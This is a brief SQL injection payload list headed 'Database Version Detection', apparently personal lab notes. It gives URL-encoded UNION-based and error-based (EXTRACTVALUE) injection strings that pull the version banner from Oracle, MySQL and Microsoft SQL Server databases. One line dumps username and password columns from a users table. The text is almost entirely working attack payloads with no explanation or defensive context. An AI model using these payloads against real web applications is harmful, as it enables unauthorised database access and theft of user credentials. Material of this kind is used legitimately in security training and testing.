//Database Version Detection ( depending on the database make mods.)
'+UNION+SELECT+@@version,+NULL# 
'+UNION+SELECT+BANNER,+NULL+FROM+@@version-- 
'+union+all+select+'1',banner+FROM+v$version-- //oracle
'+union+select+0,@@version;# //MySQL and Microsoft
'+union+all+select+username_lvfons,password_abcde+from+users_abcde--
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))-- 
